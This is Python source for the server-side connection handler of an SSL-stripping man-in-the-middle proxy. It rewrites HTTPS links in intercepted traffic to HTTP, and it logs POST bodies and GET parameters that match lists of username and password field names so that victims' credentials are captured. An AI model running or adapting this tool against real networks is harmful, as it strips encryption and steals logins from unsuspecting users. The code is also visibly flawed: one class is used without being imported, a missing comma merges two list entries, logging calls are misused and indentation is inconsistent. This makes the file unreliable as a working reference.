# Copyright (c) 2004-2009 Moxie Marlinspike
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License as
# published by the Free Software Foundation; either version 3 of the
# License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
# USA
#

import logging, re, string, random, zlib, gzip, StringIO
import plugins

from twisted.web.http import HTTPClient
from URLMonitor import URLMonitor
from libs.sergioproxy.ProxyPlugins import ProxyPlugins

class ServerConnection(HTTPClient):

    ''' The server connection is where we do the bulk of the stripping.  Everything that
    comes back is examined.  The headers we dont like are removed, and the links are stripped
    from HTTPS to HTTP.
    '''

    urlExpression     = re.compile(r"(https://[\w\d:#@%/;$()~_?\+-=\\\.&]*)", re.IGNORECASE)
    urlType           = re.compile(r"https://", re.IGNORECASE)
    urlTypewww        = re.compile(r"https://www", re.IGNORECASE)
    urlwExplicitPort  = re.compile(r'https://www([a-zA-Z0-9.]+):[0-9]+/',  re.IGNORECASE)
    urlExplicitPort   = re.compile(r'https://([a-zA-Z0-9.]+):[0-9]+/',  re.IGNORECASE)
    urlToken1 		  = re.compile(r'(https://[a-zA-Z0-9./]+\?)', re.IGNORECASE)
    urlToken2 		  = re.compile(r'(https://[a-zA-Z0-9./]+)\?{0}', re.IGNORECASE)
#    urlToken2 		  = re.compile(r'(https://[a-zA-Z0-9.]+/?[a-zA-Z0-9.]*/?)\?{0}', re.IGNORECASE)

    def __init__(self, command, uri, postData, headers, client):
        self.command          = command
        self.uri              = uri
        self.postData         = postData
        self.headers          = headers
        self.client           = client
        self.urlMonitor       = URLMonitor.getInstance()
        self.responseTamperer = ResponseTampererFactory.getTampererInstance()
        self.plugins          = ProxyPlugins.getInstance()
        self.isImageRequest   = False
        self.isCompressed     = False
        self.contentLength    = None
        self.shutdownComplete = False

        #these field names were stolen from the etter.fields file (Ettercap Project)
        self.http_userfields = ['log','login', 'wpname', 'ahd_username', 'unickname', 'nickname', 'user', 'user_name',
                                'alias', 'pseudo', 'email', 'username', '_username', 'userid', 'form_loginname', 'loginname',
                                'login_id', 'loginid', 'session_key', 'sessionkey', 'pop_login', 'uid', 'id', 'user_id', 'screename',
                                'uname', 'ulogin', 'acctname', 'account', 'member', 'mailaddress', 'membername', 'login_username',
                                'login_email', 'loginusername', 'loginemail', 'uin', 'sign-in']

        self.http_passfields = ['ahd_password', 'pass', 'password', '_password', 'passwd', 'session_password', 'sessionpassword', 
                                'login_password', 'loginpassword', 'form_pw', 'pw', 'userpassword', 'pwd', 'upassword', 'login_password'
                                'passwort', 'passwrd', 'wppassword', 'upasswd']

    def getLogLevel(self):
        return logging.DEBUG

    def getPostPrefix(self):
        return "POST"

    def sendRequest(self):
        if self.command == 'GET':
            logging.info("%s Sending Request: %s"  % (self.client.getClientIP(), self.headers['host']))

            #check for creds passed in GET requests.. It's surprising to see how many people still do this (please stahp)
            for user in self.http_userfields:
                username = re.findall("("+ user +")=([^&|;]*)", self.uri, re.IGNORECASE)

            for passw in self.http_passfields:
                password = re.findall("(" + passw + ")=([^&|;]*)", self.uri, re.IGNORECASE)

            if (username and password):
                message = "%s %s Possible Credentials (%s):\n%s" % (self.client.getClientIP(), self.command, self.headers['host'], self.uri)
                logging.warning(message)

        self.plugins.hook()
        self.sendCommand(self.command, self.uri)

    def sendHeaders(self):
        for header, value in self.headers.items():
            logging.debug(self.getLogLevel(), "Sending header: %s : %s" % (header, value))
            self.sendHeader(header, value)

        self.endHeaders()

    def sendPostData(self):
        if 'clientprfl' in self.uri:
            self.plugins.hook()
        elif 'keylog' in self.uri:
            self.plugins.hook()
        else:
            logging.warning("%s %s Data (%s):\n%s" % (self.client.getClientIP(),self.getPostPrefix(),self.headers['host'],self.postData))
            self.transport.write(self.postData)

    def connectionMade(self):
        logging.debug(self.getLogLevel(), "HTTP connection made.")
        self.plugins.hook()
        self.sendRequest()
        self.sendHeaders()
        
        if (self.command == 'POST'):
            self.sendPostData()

    def handleStatus(self, version, code, message):
        logging.debug(self.getLogLevel(), "Got server response: %s %s %s" % (version, code, message))
        self.client.setResponseCode(int(code), message)

    def handleHeader(self, key, value):
        logging.debug("Got server header: %s:%s" % (key, value))

        if (key.lower() == 'location'):
            value = self.replaceSecureLinks(value)

        if (key.lower() == 'content-type'):
            if (value.find('image') != -1):
                self.isImageRequest = True
                logging.debug("Response is image content, not scanning...")

        if (key.lower() == 'content-encoding'):
            if (value.find('gzip') != -1):
                logging.debug("Response is compressed...")
                self.isCompressed = True
        elif (key.lower() == 'content-length'):
            self.contentLength = value
        elif (key.lower() == 'set-cookie'):
            self.client.responseHeaders.addRawHeader(key, value)
        else:
            self.client.setHeader(key, value)

        self.plugins.hook()
            

    def handleEndHeaders(self):
       if (self.isImageRequest and self.contentLength != None):
           self.client.setHeader("Content-Length", self.contentLength)

       if self.length == 0:
           self.shutdown()
                        
    def handleResponsePart(self, data):
        if (self.isImageRequest):
            self.client.write(data)
        else:
            HTTPClient.handleResponsePart(self, data)

    def handleResponseEnd(self):
        if (self.isImageRequest):
            self.shutdown()
        else:
            try:
                HTTPClient.handleResponseEnd(self)
            except:
                pass

    def handleResponse(self, data):
        if (self.isCompressed):
            logging.debug("Decompressing content...")
            data = gzip.GzipFile('', 'rb', 9, StringIO.StringIO(data)).read()
            
        logging.debug("Read from server:\n" + data)
        #logging.log(self.getLogLevel(), "Read from server:\n <large data>" )

        data = self.replaceSecureLinks(data)
        res = self.plugins.hook()
        data = res['data']

        if (self.contentLength != None):
            self.client.setHeader('Content-Length', len(data))
        
        try:
            self.client.write(data) #Gets rid of some generic errors
        except:
            pass

        try:
            self.shutdown()
        except:
            logging.info("Client connection dropped before request finished.")

    def replaceSecureLinks(self, data):
        sustitucion = {}
        patchDict = self.urlMonitor.patchDict
        if len(patchDict)>0:
        	dregex = re.compile("(%s)" % "|".join(map(re.escape, patchDict.keys())))
        	data = dregex.sub(lambda x: str(patchDict[x.string[x.start() :x.end()]]), data)

		iterator = re.finditer(ServerConnection.urlExpression, data)       
        for match in iterator:
            url = match.group()

            logging.debug("Found secure reference: " + url)
            nuevaurl=self.urlMonitor.addSecureLink(self.client.getClientIP(), url)
            logging.debug("LEO replacing %s => %s"%(url,nuevaurl))
            sustitucion[url] = nuevaurl
            #data.replace(url,nuevaurl)

        #data = self.urlMonitor.DataReemplazo(data)
        if len(sustitucion)>0:
        	dregex = re.compile("(%s)" % "|".join(map(re.escape, sustitucion.keys())))
        	data = dregex.sub(lambda x: str(sustitucion[x.string[x.start() :x.end()]]), data)

        #logging.debug("LEO DEBUG received data:\n"+data)	
        #data = re.sub(ServerConnection.urlExplicitPort, r'https://\1/', data)
        #data = re.sub(ServerConnection.urlTypewww, 'http://w', data)
        #if data.find("http://w.face")!=-1:
        #	logging.debug("LEO DEBUG Found error in modifications")
        #	raw_input("Press Enter to continue")
        #return re.sub(ServerConnection.urlType, 'http://web.', data)
        return data


    def shutdown(self):
        if not self.shutdownComplete:
            self.shutdownComplete = True
            try:
                self.client.finish()
                self.transport.loseConnection()
            except:
                pass